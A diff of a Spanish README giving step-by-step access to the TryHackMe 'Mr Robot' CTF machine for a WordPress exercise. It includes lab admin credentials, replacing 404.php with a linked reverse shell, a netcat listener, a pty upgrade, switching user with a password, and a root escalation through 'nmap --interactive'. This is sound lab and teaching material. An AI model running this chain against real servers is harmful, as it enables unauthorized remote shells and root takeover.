@@ -1,21 +1,72 @@
-# Al no conseguir instalar algunas de las versiones vulnerables de WordPress (y sus softwares necesarios; PHP, MySQL, Apache2...), hemos decidido usar una máquina ya existente de un Capture The Flag de TryHackMe ->
-# El Capture The Flag en cuestión es robot, hemos resuelto el CTF para poder acceder a la máquina y modificar a nuestro gusto las configuraciones de WordPress.
+# Instrucciones para acceder a la máquina y modificar WordPress
 
-# Para acceder a esta máquina se deben seguir los siguientes pasos:
-# 1. Entrar en nuestra cuenta de TryHackMe
-# 2. Descargar el archivo de configuración de OpenVPN para conectarnos a la red de TryHackMe
-# 3. Ejecutar con "sudo openvpn archivo.ovpn"
-# 4. Navegar a https://tryhackme.com/room/robot
-# 5. Iniciar la máquina y esperar a que cargue la dirección IP de esta
-# 6. Entrar a http://IP/wp-admin y usar las credenciales "elliot" - "ER28-0652" (sin las dobles comillas)
+En este caso, hemos resuelto el CTF de TryHackMe "robot" para poder modificar las configuraciones de WordPress en la máquina. A continuación, te detallamos los pasos a seguir para acceder a la máquina y obtener privilegios elevados.
 
-# A partir de aquí ya tenemos más que suficiente para añadir o arreglar las vulnerabilidades que podamos, pero para acceder al servidor Linux y conseguir usuario root haremos lo siguiente:
-# 7. En el panel de WordPress, iremos a Templates > Editor > 404.php
-# 8. Borraremos todo lo que hay en este archivo y añadiremos el reverse shell de https://github.com/a20marsimsim/cms_wordpress_pildoras/blob/main/ataque/reverse_shell.php y editaremos la IP para poner la de nuestra interfaz de la VPN
-# 9. Ejecutaremos en nuestro sistema el comando "nc -lvnp 1234" e iremos a http://IP_VICTIMA/404.php
-# 10. Una vez hecho esto, en la terminal donde hemos ejecutado el comando "nc -lvnp 1234" obtendremos una shell con el usuario daemon en el servidor de la "víctima"
-# 11. Antes de nada, ejecutaremos este comando para obtener una terminal con /bin/bash: "python3 -c 'import pty; pty.spawn("/bin/bash")'". Ahora nos conectaremos al usuario "robot" con "su robot" y con la contraseña "abcdefghijklmnopqrstuvwxyz"
-# 12. Una vez estemos dentro del usuario "robot" iremos al directorio raíz y ejecutaremos "nmap --interactive", nos aparecerá un "dialogo" donde escribiremos "!sh", tras escribir esto, obtendremos una shell con el usuario "root".
+## Pasos para acceder a la máquina:
 
+1. **Acceder a TryHackMe:**
+   - Inicia sesión en tu cuenta de TryHackMe.
 
-# Para conseguir todo esto hemos resuelto el CTF de la siguiente manera: https://github.com/a20marsimsim/cms_wordpress_pildoras/blob/main/writeup_mrrobot.pdf
+2. **Conectar con la red de TryHackMe:**
+   - Descarga el archivo de configuración de OpenVPN desde la plataforma de TryHackMe.
+
+3. **Conexión mediante OpenVPN:**
+   - Ejecuta el siguiente comando para conectar con la red de TryHackMe:
+     ```bash
+     sudo openvpn archivo.ovpn
+     ```
+
+4. **Acceder al CTF:**
+   - Navega a [https://tryhackme.com/room/mrrobot](https://tryhackme.com/room/mrrobot).
+
+5. **Iniciar la máquina:**
+   - Inicia la máquina desde el panel de TryHackMe y espera a que se cargue la dirección IP de la máquina.
+
+6. **Acceder al panel de WordPress:**
+   - Entra en `http://IP/wp-admin` usando las siguientes credenciales:
+     - Usuario: `elliot`
+     - Contraseña: `ER28-0652`
+
+## Modificación de la máquina para explotar vulnerabilidades:
+
+A partir de este punto, puedes comenzar a modificar o añadir vulnerabilidades en la máquina. Para obtener acceso al servidor Linux y conseguir privilegios de root, sigue estos pasos:
+
+7. **Acceder al archivo 404.php:**
+   - En el panel de administración de WordPress, navega a `Templates > Editor > 404.php`.
+
+8. **Añadir un reverse shell:**
+   - Borra todo el contenido del archivo `404.php` y añade el código del reverse shell disponible en [GitHub](https://github.com/a20marsimsim/cms_wordpress_pildoras/blob/main/ataque/reverse_shell.php).
+   - Asegúrate de editar la IP para que coincida con la de tu interfaz de VPN.
+
+9. **Escuchar en tu máquina:**
+   - Ejecuta el siguiente comando en tu sistema para escuchar en el puerto 1234:
+     ```bash
+     nc -lvnp 1234
+     ```
+
+10. **Ejecutar el reverse shell:**
+    - Dirígete a `http://IP_VICTIMA/404.php` para ejecutar el reverse shell. Esto abrirá una shell en tu terminal con el usuario `daemon` en el servidor de la víctima.
+
+11. **Obtener una terminal interactiva:**
+    - Ejecuta el siguiente comando en tu terminal para obtener una shell con `/bin/bash`:
+      ```bash
+      python3 -c 'import pty; pty.spawn("/bin/bash")'
+      ```
+
+12. **Acceder al usuario "robot":**
+    - Conéctate al usuario `robot` ejecutando:
+      ```bash
+      su robot
+      ```
+      - Contraseña: `abcdefghijklmnopqrstuvwxyz`
+
+13. **Obtener acceso root:**
+    - Una vez dentro del usuario `robot`, ve al directorio raíz y ejecuta `nmap` de la siguiente manera:
+      ```bash
+      nmap --interactive
+      ```
+    - Esto abrirá un diálogo donde escribirás `!sh`. Tras esto, obtendrás una shell con el usuario `root`.
+
+## Resumen del CTF
+
+Para obtener más detalles sobre cómo se resolvió el CTF, puedes consultar el siguiente [writeup en PDF](https://github.com/a20marsimsim/cms_wordpress_pildoras/blob/main/writeup_mrrobot.pdf).
